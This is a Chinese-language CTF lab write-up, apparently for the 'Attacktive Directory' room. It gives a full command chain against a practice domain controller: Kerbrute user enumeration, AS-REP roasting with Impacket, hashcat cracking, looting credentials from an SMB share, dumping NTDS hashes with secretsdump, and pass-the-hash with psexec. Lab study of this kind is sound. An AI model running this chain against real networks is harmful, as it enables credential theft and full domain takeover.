# Attacktive Directory

99%的公司网络都使用AD。但您能利用易受攻击的域控制器吗？

---

## 端口扫描

循例 nmap扫：

    53/tcp   open  domain
    80/tcp   open  http
    88/tcp   open  kerberos-sec
    135/tcp  open  msrpc
    139/tcp  open  netbios-ssn
    389/tcp  open  ldap
    445/tcp  open  microsoft-ds
    464/tcp  open  kpasswd5
    593/tcp  open  http-rpc-epmap
    636/tcp  open  ldapssl
    3268/tcp open  globalcatLDAP
    3269/tcp open  globalcatLDAPssl
    3389/tcp open  ms-wbt-server

enum4linux枚举smb

通过访问3389，我们得知 spookysec.local

## Kerberos账户枚举 

Kerbrute 发送没有预身份验证的 TGT 请求。如果 KDC 响应错误，则用户名不存在。但是，如果 KDC 提示进行预身份验证，则我们知道用户名存在，我们将继续操作。这不会导致任何登录失败，因此不会锁定任何帐户。

    ./windows-tools_and_exp/kerbrute userenum -d spookysec.local --dc 10.10.110.53 ./test1.txt

我们发现：

    svc-admin@spookysec.local
    backup@spookysec.local
    administrator@spookysec.local

## AS-REP烘培

用户帐户枚举完成后，我们可以尝试使用称为 ASREPRoasting 的攻击方法滥用 Kerberos 中的功能。当用户帐户设置了“不需要预身份验证”权限时，就会发生 ASReproasting。这意味着，在指定用户帐户上请求 Kerberos 票证之前，该帐户无需提供有效标识。

Impacket有一个名为“GetNPUsers.py”的工具（位于/usr/share/doc/python3-impacket/examples/GetNPUsers.py），允许我们从密钥分发中心查询ASReproastable帐户。查询帐户唯一需要的是一组有效的用户名，我们之前通过 Kerbrute 枚举了这些用户名。

新建文件，内容：

    svc-admin
    backup
    administrator

运行GetNPUsers.py

    python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -usersfile ./test1.txt -dc-ip 10.10.110.53 -no-pass -request spookysec.local/

hashcat爆破：

    hashcat -a 0 -m 18200 ./hash /usr/share/wordlists/rockyou.txt

## SMB列举

    smbclient -L 10.10.110.53 -U svc-admin@spookysec.local

进入backup共享文件夹：

    smbclient //10.10.110.53/backup -U svc-admin@spookysec.local

    get backup_credentials.txt

里面是base64:

    echo "********" | base64 -d

## 远程转储ntds

3389连进去，开了AV，mimikatz用不了

使用secretsdump.py

    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc spookysec.local/backup@10.10.110.53

获得ntlm hash之后我们使用psexec.py来通过pass the hash获得cmd会话

    python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes **************:************ spookysec.local/Administrator@10.10.110.53
